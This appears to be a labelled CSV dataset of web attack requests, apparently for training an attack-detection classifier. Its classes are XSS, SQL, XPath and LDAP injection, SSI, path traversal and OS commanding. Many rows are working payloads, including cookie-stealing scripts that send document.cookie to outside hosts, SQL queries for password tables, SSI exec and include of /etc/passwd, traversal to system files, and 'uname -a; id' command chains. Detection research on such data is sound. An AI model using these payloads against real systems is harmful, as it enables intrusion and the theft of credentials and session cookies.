,id,class,vector
8539,8539,XSS,/l9s/te.swf?2iE=746&deagm=rnmrks&rebS=85ettpihzN0&Hosfd3houbeer=081430396&ddueh=badmin&1g=%3Cbgsound+++++src+++%3D++++%22++++javascript%3A++%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.ch.com%2Fcgi-bin%2Flemanaic.cgi%27%2Bdocument.cookie%29%3B%5D+%22+%3E&goRSngot=t8u
8540,8540,XPathInjection,/yvPq/df1rluzxghesbfivc/tPghkt/vy/RJ@sS2zsq-Zboot.ini.php?oPKjY=%3Cromihdrops1eiNmisystem5c+nph-&noion=ihir%27++++or++++6+%3C+++++count%28path%2Fchild%3A%3A*%29+or++++%27eitue%27++%3D++%27&tcnmes=nonathopgeat&smFih9Wa8hq=2340&oDyttge=tkIt&f6R.=3&nuaiahas=63%3F&mcnn9thoh=e++ot&tnpldIrRaeooqS=22516352&wa=tbx&HDexecCDsinBR7=110723&wcxO7zdhn=qcstE8htaoam&eryhbtta2neR=60&kAwEaseae3ejn=Ep
8541,8541,SSI,/oaaU.mspx?EKdRgXV.G=60&itioue=hltnye2glotuSe&obMJqdyseimal=33958256&mEthtetnRnctfom=ht7laoEyoi+%3CI%3Dr&aezi=iaA&sde7anfbsrin=io1aU9zaetdtshesa&lctn5ipz=%3C%21++%23%3C%21--%23exec+++++cmd%3D%22id%22--%3E&cZdformep-stdin=926284&dulw8oir4hpLh7=uM%3AshaglsnAyp%24n
8542,8542,PathTransversal,rw=wom&nnhinudroz=sa&gumil=zga&JTrQRMs=do=5a&riwoTm=rd9oab
8543,8543,SSI,dEh5=7&9pgCprocessing-instructioninR36@O=23195&sta55Lcmhe2pm=i~a&DAt=ieOI&tweprNie=owsmdiqteo&ke=mAeA(ia:eO at3&jiiadEaameF=Isfcm2azT;d&0daemn=eO4rYWwpF3&VGKZJ=Aserboevit=irf&tiaaIyoaC0fa5at=eh
8544,8544,SqlInjection,/eDw0dxqfRPCcBHS8t/PYVtt0SxxllZu.jpg?ZQQ85A=8500241&otVRsNciAkCaae=2Uie&atnwT=38839&gtre6eRf8=38544948&ih=iy&fzdessu=%27union++select++++PASSWORD++from++DBA_PASSWORD%3B--&hm=ttloshEtresf8namw&likeMUjn=5i9iIDpTXhr&gy=f5hJcR_hqJH%40
8545,8545,XPathInjection,/jwLtsnd1tmlyi/rrS6oOstelrq/pIVKgGkjpug1/hiu0sP/shO/peUi.js?IEgYncpdvartFYa=%7C&camtuss=%7C7wIomsaSeer2i&pDfT=orAtnK&a9af=ov&dei=bgv2%27+or+%28i+++%3C++++count%28reegOd%2Fchild%3A%3Atext%28%29%29+and++++j+%3C+++++count%284ogR%2Fchild%3A%3Acomment%28%29%29++++and+k+%3C+count%283telf%2Fchild%3A%3A*%29+++++%29+++++or+%27hfdtizi3%27++%3D%27++ern7%27+or&D0@deleteNP=rR&alrPFsmfeaTinee=5257399632
8546,8546,LdapInjection,/leiosat2O7Odt/winntt/g8Q/65mcukfctzrGee.gif?mleC=ltfromqsdnphpava&il7m=p+Ir&ijun6sAeeRv=bqGNc_&emoNi=tvv0&sH7arreap=6&wngf9Tmkpitm=843561219&mdnEnlrodalea=%29++++%28+++%7C+%28+cn%3D*o+%27brien*+++%29%28mail%3D*o++++%27brien*+++%29+++&elnfkeu=%25i%5Dr%29na8emailkrtsstuzs&vDo6=er&oep=0Fsebrc6%3Biwp-&nsafep=tUkI2sdl&erpwFarabqtwOd=srAnHMegss3&Eteleaas=%5Bre
8547,8547,PathTransversal,/n@N/fwinnnmzgA/utonrwgerd6ornefl5l/718lDadqEht6e/84wPhWgiw/Bn3s7erxs8n/dNZNuFOT0PNZ8ZjVh-/ntd5r/so/ngt9thtsanthdeo/rpghgrlvlNn.htm?nkq=..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&eo=Alx
8548,8548,XSS,/4fc68udesigsa/0WoKbgsound1or/Nt/kne7ana5hetnbeuvsn/teifYeshadbu/c.k@dC.aVvya/5MvSiiIkQo@T-K/shuoioeatf/rnow1/Tvvreeelsry0t/ga2sbdaolo4laacossi/efihchnsroAoz.nsf?a2GuQ=rvar%2Fiag%3Dchildewne&ftaNTio=deiaeiophIS55epone&wtebar=dx9O33E&9rnynacaeisui=iLakir+++++%22++++++++style%3Dleft%3Aexpression%28alert%28%22+++sboBSl.h0a7+++++%22%29%29++alt++++%3D+++%22&ie0=6391
8549,8549,PathTransversal,/titu0n7dcbejd4/eTDn8O/Veonm3c/uLaeLo3ciegegn/5tpd6tsD5edp/cDIMMgkecBXM.html?hbzN5-Uq=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fmy.conf&AandnlQhUVxshutdownh=l4k9tseae0ywebetweend&h6ne=74828439&2rxsm=suniFetdaAtb%3C&8risdenet=Gee&adgtmibEosit=esr&1vs4fltm=+Bupdate%2Fafhtpassno5&ephddio2ei=0425187&dyo3eacs=f&eetst=p%26rg&aol4mtc=apttfdntlie%3Berk&el=dr
8550,8550,XPathInjection,/iaZr/rHW9_.tbMwizkV/foIsDwHfb3e/aq8z1G9q6PVPrI2wSsm/radVYg/Kha/2@xz1x/nykvJX7Nr/tehHtSnjivbRbuy/dEDNuwlDq/aJlxz.jsp?QRI5KqiiO5t=47071&EIkNnull=653877&aDMR3=NoC%27++or+++6+++%3C++++count%28path%2Fchild%3A%3A*%29+or++%27lio3iior%27%3D++%27&Xj8position=005&xPioNetaawl=inose+&gvd=iotmnl4d&access_logsysteme1eX=wt6ibzt&weafundoztoyty=773
8551,8551,SqlInjection,/uJvoBS.pl?BA_wcfeHXDT5=em%27%2F**%2FUNION%2F**%2FSELECT%2F**%2Fhigaxde0%2F**%2FFROM%2F**%2Fdba_users%2F**%2FWHERE%2F**%2Ffw%2F**%2Flike%2F**%2F%27%2525&HEtIS7sKgfO=029297545&ei=lswosnltEpasswdnaepa&jucAmt=50&Y0m4=e0HQ1&hsItAnou2o6qvoe=oRD_cr&eLwtt6zeatdr=b3thR
8552,8552,SSI,/hTobjectPy_HjRdn/9ndo5atiSUerm/TehraeoaNa/Thhot9ttrOlecu.gif?nvi7q9fuPleg=nme1asn&om9ryf=ilozHRzxZ6.g&dtasScl=8759544&oveiot7ssthBp=%3C%21+%23%3C%21--+++%23exec++++cmd%3D%22id%22--%3E&ftictPkeepmhnOr=cooltn+%7Enw%40
8553,8553,PathTransversal,/k.YI5P/enIniINrrrgyt.aspx?ra=4e7emol&9I=787&deasiasweF=%28hetuyIuku&atemaMolhg6n9e=cmvmsp2jte&eb6zgbu8oheAsg5=aS7oHLHOW41Y&fsock_streamLKsFul=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&TY-Z=n&3aNsoiytqr=lw%5Dk&nSzlzeutass=oiat&N5os=3447920
8554,8554,LdapInjection,/W0dYS/rnNyloT.5rX/rP/sDGovgc_OMG6UlaiRWJ/rorawmmotsa/aDK0gyuqjGsEK/S2atO3/pslaettqedi5pee/ssdsru/ml.swf?hdoitgeozj=SQaptey&xv=sI%28%5Cu&reteuoTgeresxe=62&esrdhbhmtds=or_ePOjiGGKf&aipj=bl&hntayrres3Mrgr=15&aue1rdaNyiEtnng=27281248&7rk=%27aptelnetsn&ezisuai9ERALrUt=ulm5rrel%3Aohandt5fwnwp-oi&0ex3iiwehfri=sfCAHJV&Y-phnL.Khk=466&itOmtd8H=iuCjdR&Nyilrit=733361
8555,8555,XSS,/qn5QIhid/u7XfU/ceg/nVWkWPWMD/q_mWJpe/Xc/naihorSt/cp1ivn/cr0trtrtweonasbis/fvhjd/s46FXeiti36/l2JY8.sh?qbCup=tL_X&ousdehz6t=rapperlnwsunnh&-K79Vty=6596174765&Hz9K6=2047&hesaleere=0&7s3gghmeaaB=%3Cbgsound++++src%3D++%22++javascript%3A+++%5Balert++%28%27TdbI3mtE%27%29%3B%5D%22++++%3E&LElpj1XstdinNetcp=98600&rategl=hra%29A&AVcmdFtLRNPl@=tsc
8556,8556,SSI,/dbmar7eZN1IH/ywiiumh/LJSfadY/nolnshhBifn50tazach/BYmLK@/en6lee/nILlJ3V5wiFKhKtLlt/k6eVKWoeboGyZDzWIjhO.tiff?rn=geoy&AlSb9sEnfrYsd=577496&yhS=orT&etEaee=%3C%21--%23email+fromhost%3D%22www.rhizde.com%22+tohost%3D%22mailbox.lun9u.com%22+message%3D%22oeso+nchoch+otfrztht+laoone%22+fromaddress%3D%22freh.com%22+toaddress%3D%22htkcd.Kl48mo.com%22+subject%3D%22ghr%22+sender%3D%22D2.com%22+replyto%3D%22mrlma.com%22+cc%3D%22me%22+inreplyto%3D%22dane+ua0i+e23wis%22+id%3D%22Anmail%22+--%3E&Cun6ei9tIE=t+6&lePvl=lmbCnTjUDA&Tb1u=t9MO5&-lCNregL=89142&zoAtsa=hy&eTfoen=uo9iw&mtrNwpteoseIle=p&01stiaajE=02
8557,8557,OsCommanding,"/scripts/file.bat"""
8558,8558,SqlInjection,img0IbmtelnetNKF=' OR 'eu2a'   LIKE    'aze%25&adeononagnthoo=rdelee5teoaia&7sj=xc5&noath2grlEvr4oo=4
8559,8559,SqlInjection,/sIUHSgTIXRyRJL7RWeCD.html?eitns=%27++++union+++++select+++++sum%28sdL0t%29++from++++eud3jie--
8560,8560,XSS,/dsveD9g/hP.gGlh@LGBVMs2FkM/onraPtpdbfn/itYiOmesdmesinR/ay4isL6hohtwoteo4ato/CgLmBUCV_L4/eNUEswTnD8ILkhMp/733Al/JvZaPYe-@MrZd_/aeyynae8mlsseSano8ac/96y./lslEensemi0seee.php?EKnullV=%3Ciframe++++src++%3D+++%22+++vbscript%3A%5Bwindow.open%28%27http%3A%2F%2F149.254.79.11%2Ferch.mdb%27%2Bdocument.cookie%29%3B%5D++++++%22+%3E&an9eAeT=positionnchild9eiypu
8561,8561,XSS,/plZi6/rMiV0.RY7YTJ8gGi0dJ.png?fwc0dHq_-=6111445&42l_MA=7153475&-.JGP2=%3Cdiv++++style%3D++++%22+++++binding%3A+url%28%5Bhttp%3A%2F%2Fwww.asmesest.com%2Fscript%2FnGeq.php4%5D%29%3B++%22+++%3E&ipew4t=aannet+e1omphaa&1Eq=9164&aeoteetl8niattE=He&ttaish=nosXC&Thle0R=tn+t&8ii=mfP&mIsx=deo%24likea%3BeNerselectscriptwp&KoC@RtOm0qo.=luo
8562,8562,XPathInjection,lva=wo&9i=0043&8trnhl6ETez1fr=gincludefr&ae=h1fd&rp=018726135&dnrrifnaO=tvCeUiosltwbdSd&zAdNerDntzaj9=|7on&jrNeoc=59204&hdss0oatieoK=jZF&es=oirI2TeeaeesdcnM&cr=v7KL7qenn
8563,8563,XPathInjection,/gT5z3hG@b1r5.i7TW/emRvahE-EWLzmTrfEL9y/if51w@OaYH6u6VZI/xkVYfld5p927/hmdnrehSja8/aolloud4snDirdt4/hLh/NT326Y9n.sh?coAEUu2ngyaedaa=77&bchildTinclude8dLxWs=ri%27+++or+++++4%2F8re%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D6%5D+++++or++++%273m5l%27+++%3D+%27&sdapsko=1&ti5ls2we=aXO0tc39V&42VEdwherescriptT=741
8564,8564,XPathInjection,/aO4mloLdtnsanNGhta/lrpam0tlee9j/nCQpF1zrTtE/zJi1v/raOLmxgykiJkL.php?2ndMjw=l.LBes&othO9y=a9i&8eimrleoyaepai6=t%2Bemwxs%25&aislmhsrqdpa=1sipe%27+or++%28i++%3C+count%28hnul%2Fchild%3A%3Atext%28%29%29++++and++++j+++++%3C++++count%281b4pNu%2Fchild%3A%3Acomment%28%29%29+and++k++++%3C++++count%28at%2Fchild%3A%3A*%29+++++%29+or+%27aheydUth%27++++%3D++++%27++++excyt%27+++++or&6litadhx=53371&t96nli5L=euhUIC9gl5Op&yyjO=teud&itp4simt4wh=%28hr&sedmcEt=4591
8565,8565,XSS,cimanauadoTe=eICD0l&reoig2eetm5oqo=cm]8ihjiA&ftsIgihhinv=39282&eP8eQ3pncJ=f38Xr&_eIqazbWtmp2=tmetaod&ve2dmlrodi=00674&p4openbdb=drstntaNwRtu&ydeohoD2htesht=0542182&NiframexaR0_V=p&rff8ihodeRto=Isttmdiimptnrael6&eevlRazcEw=i8reum8gae&Tkemysh=864&GNGmmxmlbKbody@VP=22851&lehtR6=|t  Ywn4@vuSf\?e
8566,8566,LdapInjection,/o2lUIRiWZ77erXsUew/gb7sQ7tow/tmuuywhebsR7eotbwnr/lvxdtLC/rQ.U4O0J5z@QPv2_Ua95/cfOSv9e7ner/1rBBl.php4?B8objectp1fC8YqC=m3%26e&9Ns1ne=lxmlt0bd&vwd=oCaS9oWF&9asegav8tisj1s=7yshtxttux%2Btte&ieneqleoh=Zyrsnlrlc&e3tNeiwfdnh=nQ.V&bT=eoaef%29%28%7C++%28tuan%3D*%29
8567,8567,XPathInjection,/-1jBzstdinkWLF1A82W/ero.css?lDnue=betweenr+&reloemico=kttanHt%27++or+++count%28++path%2Fchild%3A%3Anode%28%29%5Bposition%28+%29%3D%28%28i+++%2Bj++++%2B+k++%2B++l+%2B++1%29%5D+++%7C+++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+or++++%27sn%27++++%3D++%27+++++tamna%27+++++or&tlri2r1p=oix0s0ahaii4deihn&OX3sxn=shfteeatSc&ebsfinl5du=aEesn8k03ffiee&Odn=eutosethttpshtpasssre&heci3aeobpcee=%7E%28+t&JL-boot.iniT.vHUv=ydlobbersHam5sizs&G7dOzqk8uW8Z=ero8%5Csf2&sal1ee=29&oE=deewl
8568,8568,LdapInjection,/a_RT/rC8/exfe4hn1/_7jgFcatzz/iA.Jo47UehS5le/tjhmuEr6a/unaaua/lRYM-zNvnKUR9fQMD.css?KTd3n2ftpscriptMnBc=aP3fni&9dtor3ow2er=i_AZZb&wz3iHsfEnByejic=824&yoet=ti&cadrenrettbu=7&lnt9e77etIp=a+&goBn=obanh%40%7EesEete&cd1cWusS=37354&rldaefioNstueae=A%25N%3Ftlocation0sepD&SPost=fromTadiv&sJhh=94285158
8569,8569,XPathInjection,/ft/m.1NyC3x/tyHoI.YZdTr2/wJajf6c/icete/s0ii0aemeritttaeih0Y/ehnqSQXRu4Z/gbh/-9MGcE0-/ogRaxrXdnlSwfd.msf?9l6rasnedw6mt=U
8570,8570,SqlInjection,/egpaF-gb56/arfqensi0/htwe/iijfmusjodssmi1ri/t0fw0YA-4h/ueenrraTectuohos/bs/sZ-Zq/6hkrihd/hweeth95satinh7dshh/oLK6IXtfY..cfm?tndfteS6t=e3c3ztmpcmdi%26rcpkcopynthomees&7awlh=OrigText%27OR%27At%27%3D%272ti%27&cmdYMqFWDlOc=989787&ostcMadra=8cpet26peyrdtqt&Eo=ercpji&rqetzkheSnCsdrf=styledOeezIhom%40oy%7Eh%29d5
8571,8571,SqlInjection,/0rWM17qoptw4LOf-l/8aiec/AKOjpTe_4b/EY/5cVlVdh9FKXE/yLbehJmdN-jbWnsCY/xidtnh/oA-g0Hu/w.duIzubh/x6V5N8eB/ba3pij7ennRuExrte.jpeg?apbtrnrhtWckziO=l&SyltvnotwNapDld=sb1vU2T0hbG&m2iicwii=da&uO7t0citee=973&ma=572796&hbpindowHk=81&QDaF9bjOZE=hian&Hmjnayki=gmvuZSSU29%40&3oeyhrc0lS=bFshutdown&Fitd4=%27++++OR+%27gxs2n%27++%3C+++%27X
8572,8572,PathTransversal,///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////?
8573,8573,SqlInjection,/4FPQX2yU0Q2./aBfy0I9Fw/Aerae0eahc2naop3ettd/nW@PL0sL1OA2eKY/eps41flJ3/tpq7y9i.tiff?PPi0cmd_i8S=49816281&qleX8rf=540&asoeti0=et_&jr4esinh2=91&ynaeea=eh&ettcyetensa7cr=hopentetsho%3Don&X5libi=959&tideena3ujR=bqvU&YpuE=die&GehXJhU=scriptumtslne&tdrhoNde1p7lA=a&eaacawaonni=229&optbMfromgftp2MB7P=document1Iany&7-binyXM=%26x9h0uhcmd
8574,8574,XSS,/ns8qh/oq/eVS9bjZtLVcIi46F@AdH/3E9C1vSXD86gucjnDUt7.aspx?hiscEntirPbmep=o5dedWLi&hEhuttoOgIqaK=510292541&mednnurrsbiO=cri%3Es7ydtetc%3E9perl-i8y%25e&i6triedii=f2tforwisa5a&susteqrekvoh=winntwdhadivedEmtnA9O&arAnXxstu=2127&16WdIatpwA=%3C%3Cscript++%3E%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.seitgeon.com%2Fcgi-bin%2Fornetaro.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript++++%3E&tugefwIIeurd=41980&S7oli=hfe4unatimbce&sTelolnzreo=022536931&GMBe=ny-NKo&htkyirxo6=0234677&ZKadminq2y@A_=8copyjbapasswdnph-%3D%25ecygroup+byro
8575,8575,XSS,/ttkAhhteeiacT/l3fA.php4?ecaetti=2157&uif9ylahr=670&Hedtxrlae=1135&tre5=poq&1wxtermandSmetalY=sRspassthruuafaeno+eeo&qemxad1alco546=oJtshes&rwrcettAof=%3C%3Cscript+++%3E%5Balert+++%28%27ripowiumt%27%29%3B%5D%3C%2Fscript++++%3E&nnctssdvo=t0sit&roRcSdltscztua=oapntfbvousec6stic&flcyNesrO=r3&rn7wkrl=Tr1rr&cofg1oiyh6iDu=sreeaE5&yhdea=mgtha8k%40Nlcii9&6irl2di=1511
8576,8576,PathTransversal,/ttk63kUmbAqQkk/sep/emmva9eLpl/a3R6TJyLxJKyTb/ZPX0f4O1Wi/amdnewtDlFmTlrhki0xy/nwSkvlnPg9alzeBhkVK/uuzuCexec/67tort4lnlmbvl3/m1EEU4EFjIlTHKZ8G/eq/cBYE7pUTXhskBYzY.msf?taP=cXJoFs5MiGMM&iinO=nexec%3F&where92BbWma9SandR=k2gfda+tf%3Datt+zydz1&taala=184657081&hJ0A6zDBZ=+%27%3B47w&erdhiE=..%2F..%2F..%2FWINNT%2Fautoexec.bat&e7aswnonisv=sdiv%28ne&semecke=09C%40EMgS%40g
8577,8577,SqlInjection,/cVKxam/h3Aroty8fhirharcyR8v/nIRc-J9FfuLy4D.cfm?BwiEr=%3B+++++insert++into+++++OPENROWSET%28+++%27SQLoledb%27%2C%27uid%3Dwzeinp6snr%3Bpwd%3D0sunmcon%3BNetwork%3DDBMSSOCN%3BAddress%3D242.126.2.51%2C1433%3B%27%2C%27select+++++*+++++from++++_sysdatabases%27%29%3B+select+++*+from+LinkedOrRemoteSrv1.master.dbo.sysdatabases&pFat=2390032845
8578,8578,SSI,/of2oj/luqKivaTetente/ytd4tt9hncjhAv2rrsc/nr2ephepssllem9nb/e-/YOc0z9u9Fu.jpeg?cirqKedL=%3C%21--++++%23exec+++++cmd%3D%22c%3A%5Cprogra%7E1%5Cesinoq8peh%5C8l%5Caobibfne.exe+++++d%3A%5CR1k%5Cwww.orilerti.org%5CnMd%5Cdatabase.mdb+++++%2Fx++++exporttofoxpro%22--%3E&sA=oE
8579,8579,OsCommanding,/wtE/d-emMQdEFIiVGDCK/u1edooaanhes/aen0.asmx?e9ersscelsnEcU=qraa&ntztainh6=sh6dneicE&zht3plotaebaEn=503481427&oDf7h=agerot00ruaou&utEra=jdenrvh2mSzgdy&Euen=n%27&Ear3usg5StSa=3678&eeIr8injeneoed=+++++%3B++echo+++++%3B++++w+++++++%3B++++uname++++-a++++++%3B+id&a50hZ9ec6uveibd=8
8580,8580,SqlInjection,/dTCvsb8dHf4t2yEP7/eo6ajhBo1rrbeiu/uFmz6seoezn/e3ie7a4tslk.msf?Olni=775259++or+id%3E8++++or++++ls_id%3C602
8581,8581,XPathInjection,airh7Fov5btlse=-AsoFb4sia Nn&ftworpsrus=191066&mNRs=28&K-a.MhttpsiQaH2=endw'     or   5o/Bi/child::node()[processing-instruction()=9]   or     'tsajee0'='
8582,8582,SSI,TenbI7l=pdangW&rgte=euuaye;f&e2to4Ioht6hohz=31912623&hr5W7N7=theyrtMsegh 2&sels7eore0R=ccemrqt
8583,8583,PathTransversal,havingzpdeletepgSVformPo=EluppgaerhueO&ufeieeibCtk=i ebinlp&8sq11tisnsf=65&4AoenarotcbTay=copyadminpasswdesskt09&havingO34RV=/&E]infyw&1rea=tmaai|so &testsiinphiwyj=eiyos Rhec&Rehsta2tonutsei=egr&M9D_D=a]&ubnaser=58354&nanh1pcgwseoyl=2&Eeahssanflga=ifZKIGFek
8584,8584,LdapInjection,/1gcngu3/eCRyQ/t.tSjGroU/Nseuxxp_AURKz6documentusrY/mt/s4swPguFH-/jtd6atalosh5eycriah/tt@A4tGu8lFJ2r5/ceenejie.cgi?idael9egriAeco=oj4hm&usu=2&fZFYJ=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29
8585,8585,SSI,/9e0MuE/oxi3/e.urrl-/u-jYT1fAw9/idccconnectg.png?tsyJAtQdocumentinputp=cii&stdinnTlocationa6LVUK=cEZ&lAe=89865522&ncaop=ettr2&a.E.uftpNx=4
8586,8586,LdapInjection,/swM7A/t9eyuIiem11lte/eehawo/aXI.wC_TVpk@E4DxmYLx/OgMcseeiX1fasvo/ecF-wDyKDH3Y@HcCdRl/xtKgpbAaJ32OSlib/husaeljHatedeA.gif?ttth=euuoz&7s2LC=87levalvatdeletee5rn&utnino2nn=6hh3cnl&lvnlitxdarTtel=ei092olzcoe&eryNtnhbmnesos=+tnjrxl%28l&ia419=495359&zsftwns9nn=ehttpeitanhseA%3Dee&cwh=xSsKMen7&qhomssgNQwnaq=s9&txe=%24t+eRn&hijnh=291%29%28%26%28objectClass%3Dath%29%28%7C%28sn+%3D+++ypmf%29%28cn%3Dcomq++++J*%29%29&eDma0ilnma=iidstwsst6&tsSsnt1woterixk=nmELB&mf1tnyrtodt1=hOsetTrnA%26dHm
8587,8587,PathTransversal,/6Hla-CjG_1dEGi4EI8/odqk0.fi@d/lQs3pDVFL8yLcmd/e2qGg/21jwob/rD-_/dBq.exe?s6rtaqe=3820&aeOahpRlvrLb=i%7E%3Di+oQieiws+%2Fwe&xdicca=165511659&ajqTD8BCpOWD=%5BoAi&Mjqv.l3WurcpV=adpPoLkPS&eie9mfe=stdin+tuhmfT+fyd&hh=458711933&tfyaeuqN=%3F&lqar6lmetwne=gtacfrto&emtre9d=oel+sc
8588,8588,SSI,"5aa4eosiixk=6&ngoe=ns| ecpb=oh&eolNhth0E=<!--    #odbc   statement =   ""select    cfdrIi,  eh,     nwuf   from    fa3qhss  order   by  3,  82,   8""     -->&lplPWexeck=j+i a&Grgeneu=lseolxutEg jx6&7dhgrreule=yQnTHLp3iQ0k"
8589,8589,XSS,"aieemrfsrAw=pWZdifhtefbt&yQU1=i2 4&hhrehefem=dkw&UhIq=oP9XDArUNS&ferr=13&hr=abetweenotm3eiRlate&lbfntaeuort=uhadmin?(uusrsphpla&aeeu87mdt4azue=286536610&fe=dlkP    ""   style=left:expression(alert(""   lR.ui2tS""))     alt    =    """
8590,8590,LdapInjection,Gdn=679&4dg@k4_i=ne8-zs8k.ZN&nsdqx2iu=5499597&cwnGOfymwwp-=adug)(&(objectClass= cxsn*)&logR8dkf=e&tRyhIwpdiniae=66336475&GaTm=gredasnslie dob&hh=i7gl
8591,8591,SSI,"eeel6fnto=t1&phtauY=<!--   #include  virtual=""/etc/httpd/httpd.conf"" -->&qD=gh&lsqnxade=1129&ojyaeooa6c=3&t4=520150&andtbLs2libJlN=Mnahossphirey&fe=adminOonaBysuw n9<accepto&esse=Yt(8e5e"
8592,8592,LdapInjection,/ecptahyi/tRB8ufK4FRYuoQ8z@B.gif?estidtE=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&es4uihwesitiulk=4499&tnew74i=oh%2Biekee3pmh%3C
8593,8593,SqlInjection,/JVlYmxDqxvhG/lL-q6Bh9AbN/f7/JG628dTXiZR/oHiEddlanlelnjgean/xTu5qrrletkistod/tak89n9oesiee/Xu.4wqTqautoexecp/nnuojuertucsea.nsf?tri=%27++%2F**%2F++++OR++++%2F**%2F++++%27tiOkdInxO%27+++++%3E++++%27S&u2ohalany7eem=400367&aipKey6nmD=75&i7i6nais55I=41244
8594,8594,XPathInjection,/oU2OwxlDpZxQ9-C_Ny/tkm5drpnnfe/t82tJZxNqOR6hbEXb/xtr6t1ci/arfn1SW.png?Yiframe@yRd2OSVH=uchilde&s9itedN=87902+++or++1%3C++++deeJo%2Furrhcs%2Fhrrs8%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D28%5D+++or+6677%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&kreagwghen6iae=0425034&bW96b1y@Cscript=aeOx
8595,8595,LdapInjection,/uumdl/sVu4rSSCdVUIK.mspx?uaqtm4bs=iybnr%29%28++%7C+++%28canOe%3D*%29
8596,8596,XPathInjection,/rJ2jtwspkOY0rThF.@m/dUHghom7pj/eMxmVu./fNXslfdT/r@6HzDXtmFRHSwRqmXi/tGGRIzB0l7AQhyDfY/gdg/ussn3pahq/eNvRNg95V/ncinejMYw@D/oudiTyxvO/6-Fn@tqn9iI.pl?C3ittAbc5ifste=s0E&ntTdonecEnem8ff=h%25a0di5ia8%3Dur%7C%29fffde+&6tOhhny=k%2Bgnt0pstetform7&Asqi=nrHEdvtsbaggpe&Gyii=se%3B&loeheeusvw=82
8597,8597,LdapInjection,/49/ohtsFUM9LGBa0y/tZcKWZ/rreIEiioatRomcp4xoi/oORwdsJy8/sHa/ptd5AX@IUJN9NGJ.sh?P8vhAS=m1e9oi9lde1j&qtnbl=r1y%27+i5+a&hcatkohuugx=4829%29%28%26%28objectClass%3D7en%29%28%7C%28sn++++%3D+eSj%29%28cn%3DeO+J*%29%29
8598,8598,SSI,/tenteIardrnerdioSE1/fg.jpg?5eLocbtearh5=498&zozebu=%3BTahr&Exp_2MLjadminVHJ=lreplace3&Boosps1dc=https&iir=%3C%21--+++++%23include+++virtual%3D%22%2Fetc%2Fpasswd%22++++--%3E&itwa4AOaeyao=702406&ra1de=%3EwRep&crlI=fadl2agn%40plink%5Chexetcshutdownson&D80servicesOIg0VT=0684911&Ehon=hlomoeshutdown&Su2ZWY-NC=sNrf&yo=hwfmtml0Dy&4Muo=8kethtecAnjet&HryxPH0B=D%2B%7Cn8&dvuh5psRhg=pdFR8p8
8599,8599,XPathInjection,/rPlZfco7/z5d-0dq-.lS4/iqcdr3tm2oS/4waZjqcy/oEam/o2YnoNw.l@L6bVmxjSYS/nCfeEbly/7xidOEd/catJ_betweenaccess_logT-.shtml?2ansei=g9QHy050rBT1&VRCwinntQ8aEupdate=Rsr4oortayf8dOwpDi&allmdr0deilw=lgoH%27%5D++%7C++++P+++++%7C++++%2F%2Fuser%5B+++++name%2Ftext%28+++%29+++%3D++%27cans&sfhR2se=cCoQWVch3Dw&srormhcdoe=Racatceo&niswacmgte=s%5Csn&bs611hEiqeRacg=33&Rs9Q_IAPH4O=0orat&ht=552606
